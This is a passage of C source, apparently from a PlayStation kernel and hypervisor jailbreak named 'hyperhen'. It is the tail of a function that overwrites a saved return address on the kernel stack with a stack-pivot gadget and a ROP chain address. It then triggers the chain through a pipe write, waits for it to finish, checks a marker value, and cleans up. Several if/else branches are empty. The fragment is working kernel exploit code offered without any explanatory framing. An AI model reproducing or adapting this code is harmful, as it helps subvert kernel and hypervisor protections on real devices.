    kw64(kpctx->kstack + kpctx->ret_off + 8, chain_addr);
    kw64(kpctx->kstack + kpctx->ret_off, kg_pop_rsp());
    sceKernelSleep(1);

    char dummy[0x1000];
    memset(dummy, 0x41, sizeof(dummy));
    write(kpctx->pipe_fds[1], dummy, KROP_TAG_SIZE);

    for (int i = 0; i < 500 && !kpctx->done; i++) {
        sceKernelUsleep(10000);
    }
    uint64_t marker_after = kr64(marker_addr);
#ifdef HV5XX_KROP_RESTORE_ONLY
    if (kpctx->done) {
    } else {
    }
#else
    if (marker_after == 0x484B524F50353530ULL && kpctx->done) {
    } else {
    }
#endif

out:
    if (g_krop.pipe_fds[0] >= 0) {
        close(g_krop.pipe_fds[0]);
    }
    if (g_krop.pipe_fds[1] >= 0) {
        close(g_krop.pipe_fds[1]);
    }
    if (!hyperhen_success) {
        hyperhen_hv5xx_mark_failed();
    }
    sceKernelSleep(1);
    return hyperhen_success ? 0 : -1;
}
